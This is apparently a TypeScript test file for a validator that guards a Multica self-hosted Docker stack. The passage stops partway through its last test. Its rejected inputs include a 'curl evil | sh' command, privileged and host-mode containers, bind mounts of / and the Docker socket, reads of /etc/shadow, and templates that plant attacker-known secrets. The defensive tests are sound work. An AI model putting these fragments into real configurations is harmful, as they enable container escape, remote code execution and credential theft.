import { chmod, mkdtemp, readFile, rm, stat, symlink, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import {
	buildEnvContent,
	nodeSetupDeps,
	readLocalServerSettings,
	setupStackEnv,
	unsafeComposeReason,
	validateStackDir,
	writeLocalServerSettings,
	type SetupDeps,
	type StackFs,
} from "./multica-local-server-stack";

const COMPOSE = "name: multica\n\nservices:\n  postgres:\n    image: x\n  backend:\n    image: y\n  frontend:\n    image: z\n";

type Entry = { type: "file" | "dir" | "link"; mode: number; uid?: number; gid?: number; target?: string; content?: string; lstatError?: string };

/** An in-memory file system: ownership, modes and symlinks can be set at will, whatever the host's /tmp looks like. */
function fakeStackFs(entries: Record<string, Entry>): StackFs {
	const missing = (file: string) => Object.assign(new Error(`ENOENT ${file}`), { code: "ENOENT" });
	const resolve = (file: string, depth = 0): string => {
		if (depth > 8) throw missing(file);
		const parts = file.split("/").filter(Boolean);
		let current = "";
		for (const part of parts) {
			current = `${current}/${part}`;
			const entry = entries[current];
			if (!entry) throw missing(current);
			if (entry.type === "link") {
				const rest = parts.slice(current.split("/").filter(Boolean).length).join("/");
				return resolve(path.posix.join(entry.target as string, rest), depth + 1);
			}
		}
		return current === "" ? "/" : current;
	};
	const info = (entry: Entry) => ({
		isFile: () => entry.type === "file",
		isDirectory: () => entry.type === "dir",
		isSymbolicLink: () => entry.type === "link",
		mode: entry.mode,
		uid: entry.uid ?? 0,
		gid: entry.gid ?? 0,
		size: entry.content?.length ?? 0,
	});
	return {
		realpath: async (file) => resolve(file),
		stat: async (file) => info(entries[resolve(file)] as Entry),
		lstat: async (file) => {
			const parent = resolve(path.posix.dirname(file));
			const entry = entries[path.posix.join(parent, path.posix.basename(file))];
			if (!entry) throw missing(file);
			if (entry.lstatError) throw Object.assign(new Error(entry.lstatError), { code: entry.lstatError });
			return info(entry);
		},
		readFile: async (file) => {
			const entry = entries[resolve(file)];
			if (!entry || entry.type !== "file") throw missing(file);
			return entry.content ?? "";
		},
	};
}

describe("validateStackDir", () => {
	const ME = { uid: 501, gid: 20 };
	const D = "/Users/me/.multica/server";
	const F = `${D}/docker-compose.selfhost.yml`;
	const dir = (mode = 0o755, uid = 501, gid = 20): Entry => ({ type: "dir", mode, uid, gid });
	const file = (content: string, mode = 0o644, uid = 501, gid = 20): Entry => ({ type: "file", mode, uid, gid, content });
	const tree = (patch: Record<string, Entry | null> = {}): Record<string, Entry> => {
		const entries: Record<string, Entry> = {
			"/": dir(0o755, 0, 0),
			"/Users": dir(0o755, 0, 0),
			"/Users/me": dir(),
			"/Users/me/.multica": dir(),
			[D]: dir(),
			[F]: file(COMPOSE),
		};
		for (const [key, value] of Object.entries(patch)) {
			if (value === null) delete entries[key];
			else entries[key] = value;
		}
		return entries;
	};
	const validate = (entries: Record<string, Entry>, target = D, options: { uid?: number; gid?: number } = ME) => validateStackDir(target, { fs: fakeStackFs(entries), ...options });

	it("accepts a Multica stack folder and returns the canonical directory and file", async () => {
		await expect(validate(tree())).resolves.toEqual({ ok: true, dir: D, file: F });
	});

	it("accepts a private .env and a missing one (that is a setup step, not an error)", async () => {
		await expect(validate(tree({ [`${D}/.env`]: file("JWT_SECRET=x\n", 0o600) }))).resolves.toMatchObject({ ok: true });
		await expect(validate(tree())).resolves.toMatchObject({ ok: true });
	});

	it("canonicalizes a symlinked folder to its real location", async () => {
		await expect(validate(tree({ "/Users/me/link": { type: "link", mode: 0o755, target: D } }), "/Users/me/link")).resolves.toMatchObject({ ok: true, dir: D });
	});

	it("rejects a relative path, a NUL byte and a missing folder", async () => {
		await expect(validate(tree(), "server")).resolves.toEqual({ ok: false, error: "not_absolute" });
		await expect(validate(tree(), `${D}\0x`)).resolves.toEqual({ ok: false, error: "not_absolute" });
		await expect(validate(tree(), "/Users/me/missing")).resolves.toEqual({ ok: false, error: "not_found" });
	});

	it("rejects a file where a folder is expected", async () => {
		await expect(validate(tree(), F)).resolves.toEqual({ ok: false, error: "not_directory" });
	});

	it("rejects a folder or compose file that others can write", async () => {
		await expect(validate(tree({ [D]: dir(0o777) }))).resolves.toEqual({ ok: false, error: "unsafe_directory" });
		await expect(validate(tree({ [F]: file(COMPOSE, 0o666) }))).resolves.toEqual({ ok: false, error: "unsafe_compose_file" });
		await expect(validate(tree({ [F]: file(COMPOSE, 0o664, 501, 1234) }))).resolves.toEqual({ ok: false, error: "unsafe_compose_file" });
	});

	it("rejects a safe folder under a writable ancestor, because whoever can write the parent can swap the folder", async () => {
		for (const [ancestor, mode] of [["/Users/me/.multica", 0o777], ["/Users/me", 0o777], ["/Users", 0o1777], ["/", 0o777]] as const) {
			await expect(validate(tree({ [ancestor]: dir(mode, ancestor === "/" || ancestor === "/Users" ? 0 : 501) })), ancestor).resolves.toEqual({ ok: false, error: "unsafe_directory" });
		}
		await expect(validate(tree({ "/Users/me": dir(0o775, 501, 1234) }))).resolves.toEqual({ ok: false, error: "unsafe_directory" });
	});

	it("accepts a group-writable ancestor only when it is root-owned with group root/wheel or admin", async () => {
		await expect(validate(tree({ "/Users": dir(0o775, 0, 80) }))).resolves.toMatchObject({ ok: true });
		await expect(validate(tree({ "/Users": dir(0o775, 0, 0) }))).resolves.toMatchObject({ ok: true });
	});

	it("rejects a group-writable ancestor that is user-owned (any group) or root-owned for a shared group", async () => {
		for (const gid of [0, 20, 50, 80, 1234]) {
			await expect(validate(tree({ "/Users/me": dir(0o775, 501, gid) })), `user-owned ancestor ${gid}`).resolves.toEqual({ ok: false, error: "unsafe_directory" });
		}
		for (const gid of [20, 50, 1234]) {
			await expect(validate(tree({ "/Users": dir(0o775, 0, gid) })), `root-owned ancestor ${gid}`).resolves.toEqual({ ok: false, error: "unsafe_directory" });
		}
	});

	it("rejects a stack folder, compose file or .env that any group can write, whatever the group", async () => {
		for (const gid of [0, 20, 50, 80, 1234]) {
			await expect(validate(tree({ [D]: dir(0o775, 501, gid) })), `folder ${gid}`).resolves.toEqual({ ok: false, error: "unsafe_directory" });
			await expect(validate(tree({ [F]: file(COMPOSE, 0o664, 501, gid) })), `compose ${gid}`).resolves.toEqual({ ok: false, error: "unsafe_compose_file" });
			await expect(validate(tree({ [`${D}/.env`]: file("x", 0o660, 501, gid) })), `env ${gid}`).resolves.toEqual({ ok: false, error: "unsafe_env_file" });
		}
		// ME has primary group 20: that is not exclusive ownership either.
		await expect(validate(tree({ [F]: file(COMPOSE, 0o664, 501, 20) }), D, { uid: 501, gid: 20 })).resolves.toEqual({ ok: false, error: "unsafe_compose_file" });
	});

	it("holds the stack folder itself to the strict rule: a root-owned folder that group admin can write is refused too", async () => {
		await expect(validate(tree({ [D]: dir(0o775, 0, 80) }))).resolves.toEqual({ ok: false, error: "unsafe_directory" });
		await expect(validate(tree({ [D]: dir(0o775, 0, 0) }))).resolves.toEqual({ ok: false, error: "unsafe_directory" });
	});

	it("rejects a folder, ancestor or compose file owned by another user", async () => {
		await expect(validate(tree({ [D]: dir(0o755, 502) }))).resolves.toEqual({ ok: false, error: "unsafe_directory" });
		await expect(validate(tree({ "/Users/me": dir(0o755, 502) }))).resolves.toEqual({ ok: false, error: "unsafe_directory" });
		await expect(validate(tree({ [F]: file(COMPOSE, 0o644, 502) }))).resolves.toEqual({ ok: false, error: "unsafe_compose_file" });
	});

	it("rejects a .env it cannot inspect, rather than assuming there is none", async () => {
		for (const code of ["EACCES", "EPERM", "EIO"]) {
			await expect(validate(tree({ [`${D}/.env`]: { ...file("x", 0o600), lstatError: code } })), code).resolves.toEqual({ ok: false, error: "unsafe_env_file" });
		}
	});

	it("rejects a .env that is a symlink, even to a private file", async () => {
		const entries = tree({ [`${D}/.env`]: { type: "link", mode: 0o777, target: `${D}/real.env` }, [`${D}/real.env`]: file("JWT_SECRET=x", 0o600) });
		await expect(validate(entries)).resolves.toEqual({ ok: false, error: "unsafe_env_file" });
	});

	it("rejects a .env that is a symlink to a world-writable target", async () => {
		const entries = tree({ [`${D}/.env`]: { type: "link", mode: 0o777, target: "/tmp/shared.env" }, "/tmp": dir(0o1777, 0, 0), "/tmp/shared.env": file("COMPOSE_PROJECT_NAME=other", 0o666) });
		await expect(validate(entries)).resolves.toEqual({ ok: false, error: "unsafe_env_file" });
	});

	it("rejects a .env that others or a group can write, one owned by another user, one that is not a file or too large", async () => {
		for (const [name, entry] of [
			["world-writable", file("x", 0o666)],
			["group-writable", file("x", 0o660)],
			["other owner", file("x", 0o600, 502)],
			["directory", dir()],
			["huge", file("x".repeat(300 * 1024), 0o600)],
		] as const) {
			await expect(validate(tree({ [`${D}/.env`]: entry })), name).resolves.toEqual({ ok: false, error: "unsafe_env_file" });
		}
	});

	it("rejects a compose file that is a symlink, even to a good file inside the folder", async () => {
		const entries = tree({ [F]: { type: "link", mode: 0o777, target: `${D}/real.yml` }, [`${D}/real.yml`]: file(COMPOSE) });
		await expect(validate(entries)).resolves.toEqual({ ok: false, error: "unsafe_compose_file" });
	});

	it("rejects a compose file that points outside the folder", async () => {
		const entries = tree({ [F]: { type: "link", mode: 0o777, target: "/Users/me/outside.yml" }, "/Users/me/outside.yml": file(COMPOSE) });
		await expect(validate(entries)).resolves.toEqual({ ok: false, error: "unsafe_compose_file" });
	});

	it("rejects a folder without the fixed compose file name", async () => {
		await expect(validate(tree({ [F]: null, [`${D}/docker-compose.yml`]: file(COMPOSE) }))).resolves.toEqual({ ok: false, error: "no_compose_file" });
	});

	it("rejects a compose file that is not Multica's, or is too large", async () => {
		await expect(validate(tree({ [F]: file("name: other\nservices:\n  web:\n    image: x\n") }))).resolves.toEqual({ ok: false, error: "not_multica" });
		await expect(validate(tree({ [F]: file(`${COMPOSE}${"#".repeat(300 * 1024)}`) }))).resolves.toEqual({ ok: false, error: "unsafe_compose_file" });
	});

	it("does not judge ownership or modes where there is no user id (Windows)", async () => {
		await expect(validate(tree({ [D]: dir(0o777, 999), "/Users/me": dir(0o777, 999) }), D, { uid: undefined, gid: undefined } as never)).resolves.toMatchObject({ ok: true });
	});

	describe("compose content (decoded structure)", () => {
		const SERVICES = (extra = "") => `name: multica
services:
  postgres:
    image: pgvector/pgvector:pg17
  backend:
    image: b${extra}
  frontend:
    image: f
`;
		const reasonOf = (text: string) => unsafeComposeReason(text);
		const rejected = (text: string) => validate(tree({ [F]: file(text) }));
		const refused = { ok: false, error: "unsafe_compose_content" };

		const STOCK = `name: multica
services:
  postgres:
    image: pgvector/pgvector:pg17
    environment:
      POSTGRES_DB: \${POSTGRES_DB:-multica}
      POSTGRES_USER: \${POSTGRES_USER:-multica}
    volumes:
      - pgdata:/var/lib/postgresql/data
    restart: unless-stopped
    healthcheck:
      test:
        [
          "CMD-SHELL",
          "pg_isready -U x",
        ]
      interval: 5s
      timeout: 5s
      retries: 5
  backend:
    image: \${MULTICA_BACKEND_IMAGE:-ghcr.io/multica-ai/multica-backend}:\${MULTICA_IMAGE_TAG:-latest}
    depends_on:
      postgres:
        condition: service_healthy
    ports:
      - "127.0.0.1:\${BACKEND_PORT:-\${API_PORT:-\${SERVER_PORT:-\${PORT:-8080}}}}:8080"
    volumes:
      - backend_uploads:/app/data/uploads
    environment:
      PORT: "8080"
      JWT_SECRET: \${JWT_SECRET:?JWT_SECRET must be set}
    restart: unless-stopped
  frontend:
    image: f
    depends_on:
      - backend
    ports:
      - "127.0.0.1:\${FRONTEND_PORT:-3000}:3000"
volumes:
  pgdata:
  backend_uploads:
`;

		it("accepts what Multica's own file contains", async () => {
			expect(reasonOf(STOCK)).toBeNull();
			await expect(validate(tree({ [F]: file(STOCK) }))).resolves.toEqual({ ok: true, dir: D, file: F });
		});

		it("accepts the minimal shape and list-style environment, depends_on and healthcheck strings", () => {
			expect(reasonOf(SERVICES())).toBeNull();
			expect(reasonOf(SERVICES("\n    environment:\n      - A=b\n    depends_on: [postgres]\n    healthcheck:\n      test: curl -f x\n      retries: 3"))).toBeNull();
		});

		it("rejects the unsafe keys whether they are bare, quoted, in flow style or merged in through an alias", async () => {
			for (const extra of [
				"\n    privileged: true",
				'\n    "privileged": true',
				"\n    'privileged': true",
				"\n    { privileged: true }",
				"\n    <<: &evil { privileged: true }",
				"\n    include: [other.yml]",
				'\n    "include": [other.yml]',
				"\n    env_file: .env.evil",
				'\n    "env_file": [".x"]',
				"\n    extends: { file: x.yml, service: y }",
				"\n    network_mode: host",
				"\n    pid: host",
				"\n    cap_add: [ALL]",
				"\n    devices: ['/dev/sda']",
				"\n    security_opt: ['seccomp=unconfined']",
				"\n    build: ./x",
				"\n    command: sh -c 'curl evil | sh'",
				"\n    entrypoint: /bin/sh",
				"\n    user: root",
				"\n    container_name: other",
				"\n    labels: { a: b }",
			]) {
				const text = extra.includes("{ privileged: true }") && !extra.includes("<<")
					? SERVICES("\n    deploy: { privileged: true }")
					: SERVICES(extra);
				expect(await rejected(text), extra).toEqual(refused);
			}
		});

		it("rejects top-level keys other than name, services and volumes", async () => {
			for (const top of ['include:\n  - evil.yml\n', '"include":\n  - evil.yml\n', "networks: { n: {} }\n", "configs: { c: { file: /etc/passwd } }\n", "secrets: { s: { file: /etc/shadow } }\n", "x-anything: 1\n"]) {
				expect(await rejected(`${top}${SERVICES()}`), top).toEqual(refused);
			}
		});

		it("rejects long-syntax and short-syntax bind mounts, with any quoting", async () => {
			for (const volumes of [
				"      - /:/host",
				"      - ./data:/data",
				"      - ~/x:/x",
				"      - ${HOME}:/h",
				"      - /var/run/docker.sock:/var/run/docker.sock",
				"      - type: bind\n        source: /\n        target: /h",
				"      - { type: bind, source: /, target: /h }",
				"      - type: volume\n        source: /\n        target: /h",
				'      - "/:/host"',
				"      - undeclared:/data",
				"      - pgdata:relative",
			]) {
				expect(await rejected(SERVICES(`\n    volumes:\n${volumes}`) + "volumes:\n  pgdata:\n"), volumes).toEqual(refused);
			}
			expect(await rejected(SERVICES('\n    volumes: ["/:/host"]'))).toEqual(refused);
			expect(await rejected(SERVICES('\n    "volumes":\n      - type: bind\n        source: /\n        target: /h'))).toEqual(refused);
		});

		it("rejects a named volume that is a bind mount in disguise", async () => {
			for (const definition of [
				"pgdata:\n    driver_opts: { type: none, o: bind, device: / }",
				"pgdata:\n    driver: local\n    driver_opts:\n      type: none\n      o: bind\n      device: /",
				"pgdata: { driver_opts: { type: none, o: bind, device: / } }",
				"pgdata:\n    external: true",
				"pgdata:\n    name: other",
				"pgdata:\n    labels: { a: b }",
				"pgdata: other",
			]) {
				const text = `${SERVICES("\n    volumes:\n      - pgdata:/data")}volumes:\n  ${definition}\n`;
				expect(await rejected(text), definition).toEqual(refused);
			}
		});

		it("accepts bare named-volume declarations, null or empty", () => {
			expect(reasonOf(`${SERVICES("\n    volumes:\n      - pgdata:/data\n      - other:/o:ro")}volumes:\n  pgdata:\n  other: {}\n`)).toBeNull();
		});

		it("rejects ports published beyond loopback, quoted or not, in any form", async () => {
			for (const ports of [
				'    ports:\n      - "8080:8080"',
				'    ports:\n      - "0.0.0.0:8080:8080"',
				"    ports:\n      - 3000:3000",
				'    ports:\n      - "192.168.1.5:3000:3000"',
				'    ports: ["0.0.0.0:80:80"]',
				'    "ports":\n      - "0.0.0.0:80:80"',
				'    ports:\n      - "${IP:-127.0.0.1}:80:80"',
				'    ports:\n      - "127.0.0.1:0.0.0.0:80:8080"',
				"    ports:\n      - target: 80\n        published: 80\n        host_ip: 0.0.0.0",
				"    ports:\n      - 80",
			]) {
				expect(await rejected(SERVICES(`\n${ports}`)), ports).toEqual(refused);
			}
		});

		it("accepts loopback ports, IPv4 or IPv6, with interpolated host ports", () => {
			expect(reasonOf(SERVICES('\n    ports:\n      - "127.0.0.1:8080:8080"\n      - "[::1]:3000:3000/tcp"\n      - "127.0.0.1:${A:-${B:-1}}:80"'))).toBeNull();
		});

		it("rejects documents that are not a single plain mapping, repeat a key or hide behind tags", async () => {
			for (const text of [
				"- a\n- b\n",
				"just text",
				`${SERVICES()}---\n${SERVICES()}`,
				"name: multica\nname: other\nservices: {}\n",
				`${SERVICES()}services: {}\n`,
				"name: multica\nservices:\n  postgres:\n    image: !!js/function 'function(){}'\n",
				"name: multica\nservices: [unterminated\n",
				"",
			]) {
				expect(await rejected(text), text).toEqual({ ok: false, error: expect.stringMatching(/not_multica|unsafe_compose_content/) });
			}
		});

		it("rejects anchors, aliases and merge keys even when the decoded result would be fine", async () => {
			const withAnchor = "name: multica\nservices:\n  postgres:\n    image: &img pgvector\n  backend:\n    image: *img\n  frontend:\n    image: f\n";
			expect(reasonOf(withAnchor)).not.toBeNull();
			expect(reasonOf("name: multica\nservices:\n  postgres:\n    image: &img x\n")).not.toBeNull();
			expect(await rejected(withAnchor)).toEqual(refused);
			for (const merge of ["<<: { image: x }", '"<<": { image: x }', "'<<' : { image: x }", "<<:\n      image: x"]) {
				expect(reasonOf(`name: multica\nservices:\n  postgres:\n    ${merge}\n`), merge).not.toBeNull();
			}
			expect(reasonOf("name: multica\nservices:\n  postgres:\n    image: x\n    environment:\n      A: &v 1\n")).not.toBeNull();
		});

		it("accepts the characters & * ! < in ordinary string values (they are not anchors, tags or merge keys)", () => {
			expect(reasonOf(SERVICES('\n    healthcheck:\n      test: ["CMD-SHELL", "a && b || c; echo *.log !x <<EOF"]'))).toBeNull();
		});

		it("rejects very long strings anywhere", () => {
			const long = "x".repeat(5000);
			expect(reasonOf(SERVICES(`\n    environment:\n      A: ${long}`))).not.toBeNull();
			expect(reasonOf(`name: multica\nservices:\n  postgres:\n    image: ${long}\n`)).not.toBeNull();
			expect(reasonOf(SERVICES(`\n    healthcheck:\n      test: ["CMD", "${long}"]`))).not.toBeNull();
			expect(reasonOf(SERVICES(`\n    environment:\n      ${long}: a`))).not.toBeNull();
			expect(reasonOf(SERVICES(`\n    environment:\n      A: ${"y".repeat(4000)}`))).toBeNull();
		});

		it("rejects look-alike keys and names (Cyrillic, full-width, zero-width) instead of treating them as the real ones", () => {
			for (const key of ["\u0440rivileged", "privileged\u200b", "\uff50rivileged", "imag\u0435", "ports\u200b"]) {
				expect(reasonOf(SERVICES(`\n    ${key}: true`)), key).not.toBeNull();
			}
			expect(reasonOf("na\u043de: multica\nservices:\n  postgres:\n    image: x\n")).not.toBeNull();
			expect(reasonOf("name: multica\nservices:\n  p\u043estgres:\n    image: x\n")).not.toBeNull();
			expect(reasonOf(SERVICES('\n    ports:\n      - "127.0.0.\uff11:80:80"'))).not.toBeNull();
			expect(reasonOf(SERVICES('\n    volumes:\n      - "\u0440gdata:/data"') + "volumes:\n  pgdata:\n")).not.toBeNull();
		});

		it("rejects a BOM-prefixed or control-character-laden file as unparseable or unknown, never as accepted garbage", () => {
			expect(reasonOf("\uFEFFname: multica\nservices:\n  postgres:\n    image: x\n")).toBeNull();
			expect(reasonOf("name: multica\nservices:\n  postgres:\n    image: x\u0000y\n")).not.toBeNull();
		});

		it("rejects documents with extra YAML documents, including a trailing empty one with content after it", () => {
			expect(reasonOf(`${SERVICES()}\n...\n---\nname: other\n`)).not.toBeNull();
		});

		it("rejects a document that is empty, null, a scalar or a list without throwing", () => {
			for (const text of ["", "null", "~", "42", "just text", "- a\n- b\n", "[]"]) {
				expect(() => reasonOf(text), text).not.toThrow();
				expect(reasonOf(text), text).not.toBeNull();
			}
		});

		it("rejects a healthcheck with an unknown key or a value of the wrong kind", () => {
			for (const healthcheck of ["exec: foo", "test: x\n      mount: /", "test: { a: b }", "test: [1, 2]", "retries: { a: b }"]) {
				expect(reasonOf(SERVICES(`\n    healthcheck:\n      ${healthcheck}`)), healthcheck).not.toBeNull();
			}
			expect(reasonOf(SERVICES("\n    healthcheck: curl"))).not.toBeNull();
			expect(reasonOf(SERVICES("\n    healthcheck:\n      test: [CMD, curl]\n      interval: 5s\n      retries: 3"))).toBeNull();
		});

		it("rejects an alias bomb, and does so quickly", () => {
			const lines = ["a0: &a0 [x, x, x, x, x, x, x, x, x, x]"];
			for (let i = 1; i < 12; i += 1) lines.push(`a${i}: &a${i} [${Array(10).fill(`*a${i - 1}`).join(", ")}]`);
			expect(reasonOf(`name: multica\nservices:\n  postgres:\n    image: x\nvolumes: {}\n${lines.join("\n")}\n`)).not.toBeNull();
		});

		it("rejects a service name that is not a plain lowercase name, and a service that is not a mapping", () => {
			expect(reasonOf("name: multica\nservices:\n  Evil/Name:\n    image: x\n")).not.toBeNull();
			expect(reasonOf("name: multica\nservices:\n  web: image-only\n")).not.toBeNull();
			expect(reasonOf("name: multica\nservices: []\n")).not.toBeNull();
		});

		it("rejects another project name, a missing name and a service without a usable image", () => {
			expect(reasonOf("name: other\nservices:\n  postgres:\n    image: x\n")).not.toBeNull();
			expect(reasonOf("services:\n  postgres:\n    image: x\n")).not.toBeNull();
			expect(reasonOf("name: [multica]\nservices:\n  postgres:\n    image: x\n")).not.toBeNull();
			for (const image of ["", "42", "[a, b]", "{ a: b }", "null"]) {
				expect(reasonOf(`name: multica\nservices:\n  postgres:\n    image: ${image}\n`), image).not.toBeNull();
			}
			expect(reasonOf("name: multica\nservices:\n  postgres:\n    restart: always\n")).not.toBeNull();
		});

		it("rejects service volumes and ports that are not lists, without ever throwing", () => {
			for (const shape of ["volumes: {pgdata: /data}", "volumes: pgdata:/data", "volumes: 5", "ports: {a: b}", "ports: '127.0.0.1:80:80'", "ports: 80"]) {
				expect(() => reasonOf(SERVICES(`\n    ${shape}`) + "volumes:\n  pgdata:\n"), shape).not.toThrow();
				expect(reasonOf(SERVICES(`\n    ${shape}`) + "volumes:\n  pgdata:\n"), shape).not.toBeNull();
			}
		});

		it("rejects depends_on and environment of the wrong kind", () => {
			expect(reasonOf(SERVICES("\n    depends_on: [ghost]"))).not.toBeNull();
			expect(reasonOf(SERVICES("\n    depends_on: postgres"))).not.toBeNull();
			expect(reasonOf(SERVICES("\n    depends_on: 5"))).not.toBeNull();
			expect(reasonOf(SERVICES("\n    depends_on:\n      postgres:\n        condition: anything"))).not.toBeNull();
			expect(reasonOf(SERVICES("\n    environment:\n      A: { nested: x }"))).not.toBeNull();
			expect(reasonOf(SERVICES("\n    restart: sometimes"))).not.toBeNull();
		});
	});
});

describe("saved stack folder", () => {
	let state: string;
	beforeEach(async () => {
		state = await mkdtemp(path.join(os.tmpdir(), "ao-local-server-state-"));
	});
	afterEach(() => rm(state, { recursive: true, force: true }));

	it("round-trips an absolute folder in a 0600 file and reads nothing else from it", async () => {
		await writeLocalServerSettings(state, { stackDir: "/Users/me/multica" });
		expect(await readLocalServerSettings(state)).toEqual({ stackDir: "/Users/me/multica" });
		expect((await stat(path.join(state, "multica-local-server.json"))).mode & 0o777).toBe(0o600);
		expect(JSON.parse(await readFile(path.join(state, "multica-local-server.json"), "utf8"))).toEqual({ version: 1, stackDir: "/Users/me/multica" });
	});

	it("treats a missing, relative or malformed value as no folder", async () => {
		expect(await readLocalServerSettings(state)).toEqual({ stackDir: "" });
		await writeFile(path.join(state, "multica-local-server.json"), JSON.stringify({ stackDir: "relative/dir" }));
		expect(await readLocalServerSettings(state)).toEqual({ stackDir: "" });
		await writeFile(path.join(state, "multica-local-server.json"), "{not json");
		expect(await readLocalServerSettings(state)).toEqual({ stackDir: "" });
	});
});

describe("first-time setup", () => {
	const TEMPLATE = [
		"# example",
		"DATABASE_URL=postgres://multica:multica@localhost:5432/multica?sslmode=disable",
		"POSTGRES_PASSWORD=multica",
		"JWT_SECRET=change-me-in-production",
		"MULTICA_VCS_SECRET_KEY=",
		"FRONTEND_ORIGIN=http://localhost:3000",
		"",
	].join("\n");
	const counter = () => {
		let n = 0;
		return (size: number) => Buffer.alloc(size, ++n);
	};

	it("replaces the secrets like make selfhost does and leaves everything else alone", () => {
		const content = buildEnvContent(TEMPLATE, counter());

		expect(content).toContain(`JWT_SECRET=${"01".repeat(32)}`);
		expect(content).toContain(`POSTGRES_PASSWORD=${"02".repeat(24)}`);
		expect(content).toContain(`MULTICA_VCS_SECRET_KEY=${Buffer.alloc(32, 3).toString("base64")}`);
		expect(content).toContain(`DATABASE_URL=postgres://multica:${"02".repeat(24)}@localhost:5432/multica?sslmode=disable`);
		expect(content).toContain("FRONTEND_ORIGIN=http://localhost:3000");
		expect(content).not.toContain("change-me-in-production");
	});

	it("adds JWT_SECRET when the template has none, because the compose file requires it", () => {
		expect(buildEnvContent("FRONTEND_ORIGIN=http://localhost:3000", counter())).toContain(`JWT_SECRET=${"01".repeat(32)}\n`);
	});

	describe("the template is untrusted input", () => {
		const STACK = { dir: "/Users/me/.multica/server", file: "/Users/me/.multica/server/docker-compose.selfhost.yml" };
		const fakeDeps = (template: string, patch: { uid?: number; mode?: number; gid?: number; type?: "file" | "link" | "dir"; size?: number; userId?: number | undefined } = {}) => {
			const created: Array<{ file: string; content: string }> = [];
			const deps: SetupDeps = {
				randomBytes: (size) => Buffer.alloc(size, 7),
				readTemplate: async () => template,
				statTemplate: async () => ({
					isFile: () => (patch.type ?? "file") === "file",
					isDirectory: () => patch.type === "dir",
					isSymbolicLink: () => patch.type === "link",
					size: patch.size ?? template.length,
					mode: patch.mode ?? 0o644,
					uid: patch.uid ?? 501,
					gid: patch.gid ?? 20,
				}),
				createFile: async (file, content) => {
					created.push({ file, content });
				},
				uid: "userId" in patch ? patch.userId : 501,
				gid: 20,
			};
			return { deps, created };
		};

		it("accepts a template owned by the user or root that others cannot write", async () => {
			for (const [uid, mode] of [[501, 0o644], [501, 0o600], [0, 0o644], [501, 0o755]] as const) {
				const { deps, created } = fakeDeps(TEMPLATE, { uid, mode });
				expect(await setupStackEnv(STACK, deps), `${uid} ${mode.toString(8)}`).toBe("created");
				expect(created).toHaveLength(1);
			}
		});

		it("refuses a template owned by another user, whatever its mode, and writes nothing", async () => {
			for (const mode of [0o644, 0o600, 0o666]) {
				const { deps, created } = fakeDeps(TEMPLATE, { uid: 502, mode });
				expect(await setupStackEnv(STACK, deps), mode.toString(8)).toBe("failed");
				expect(created).toEqual([]);
			}
		});

		it("refuses a template that group or others can write, even when the user owns it", async () => {
			for (const mode of [0o666, 0o664, 0o660, 0o646, 0o622, 0o777]) {
				const { deps, created } = fakeDeps(TEMPLATE, { uid: 501, mode });
				expect(await setupStackEnv(STACK, deps), mode.toString(8)).toBe("failed");
				expect(created).toEqual([]);
			}
		});

		it("refuses a foreign-owned 0666 template (the reviewer's case)", async () => {
			const { deps, created } = fakeDeps(`${TEMPLATE}JWT_SECRET=known-to-attacker\n`, { uid: 502, mode: 0o666 });
			expect(await setupStackEnv(STACK, deps)).toBe("failed");
			expect(created).toEqual([]);
		});

		it("does not judge ownership or mode where there is no user id (Windows)", async () => {
			const { deps } = fakeDeps(TEMPLATE, { uid: 999, mode: 0o666, userId: undefined });
			expect(await setupStackEnv(STACK, deps)).toBe("created");
		});

		it("refuses a symlink, a directory and an oversized template", async () => {
			for (const patch of [{ type: "link" as const }, { type: "dir" as const }, { size: 70 * 1024 }]) {
				const { deps, created } = fakeDeps(TEMPLATE, patch);
				expect(await setupStackEnv(STACK, deps), JSON.stringify(patch)).toBe("failed");
				expect(created).toEqual([]);
			}
		});

		it("refuses a template that assigns a managed secret twice, however it is written, and writes nothing", async () => {
			for (const duplicate of [
				"JWT_SECRET=known-to-attacker",
				"export JWT_SECRET=known-to-attacker",
				"  JWT_SECRET=known-to-attacker",
				"\tJWT_SECRET = known-to-attacker",
				"JWT_SECRET: known-to-attacker",
				"POSTGRES_PASSWORD=known",
				"export POSTGRES_PASSWORD=known",
				"MULTICA_VCS_SECRET_KEY=known",
				"DATABASE_URL=postgres://multica:known@localhost:5432/multica",
				" export DATABASE_URL=postgres://multica:known@localhost/db",
			]) {
				const { deps, created } = fakeDeps(`${TEMPLATE}${duplicate}\n`);
				expect(await setupStackEnv(STACK, deps), duplicate).toBe("failed");
				expect(created, duplicate).toEqual([]);
			}
		});

		it("refuses a managed key hidden in an alternative form even when it is the only assignment", async () => {
			for (const only of ["export JWT_SECRET=known", "  JWT_SECRET=known", "JWT_SECRET: known", "JWT_SECRET =known"]) {
				const template = TEMPLATE.replace(/^JWT_SECRET=.*\n/m, "") + `${only}\n`;
				expect(buildEnvContent(template, () => Buffer.alloc(32, 1)), only).toBeNull();
			}
		});

		it("does not count comments or similar names as assignments", () => {
			const template = `${TEMPLATE}# JWT_SECRET=old\n#export POSTGRES_PASSWORD=x\nMY_JWT_SECRET=other\nJWT_SECRET_FILE=/x\nPOSTGRES_PASSWORD_HINT=y\n`;
			const content = buildEnvContent(template, (size) => Buffer.alloc(size, 1));
			expect(content).not.toBeNull();
			expect(content).toContain(`JWT_SECRET=${"01".repeat(32)}`);
			expect(content).toContain("# JWT_SECRET=old");
			expect(content).toContain("MY_JWT_SECRET=other");
		});

		it("wires the real current user into the real dependencies: a group-writable template on disk is refused", async () => {
			if (process.getuid === undefined) return;
			const dir = await mkdtemp(path.join(os.tmpdir(), "ao-local-server-template-"));
			try {
				await writeFile(path.join(dir, ".env.example"), TEMPLATE, { mode: 0o644 });
				const deps = nodeSetupDeps((size) => Buffer.alloc(size, 7));
				expect(deps.uid).toBe(process.getuid());
				expect(await setupStackEnv({ dir, file: path.join(dir, "docker-compose.selfhost.yml") }, deps)).toBe("created");
				await rm(path.join(dir, ".env"));
				await chmod(path.join(dir, ".env.example"), 0o666);
				expect(await setupStackEnv({ dir, file: path.join(dir, "docker-compose.selfhost.yml") }, deps)).toBe("failed");
				await expect(stat(path.join(dir, ".env"))).rejects.toThrow();
			} finally {
				await rm(dir, { recursive: true, force: true });
			}
		});

		it("leaves exactly one assignment of each managed key in what it writes", async () => {
			const { deps, created } = fakeDeps(TEMPLATE);
			expect(await setupStackEnv(STACK, deps)).toBe("created");
			const content = created[0]?.content ?? "";
			for (const key of ["JWT_SECRET", "POSTGRES_PASSWORD", "MULTICA_VCS_SECRET_KEY", "DATABASE_URL"]) {
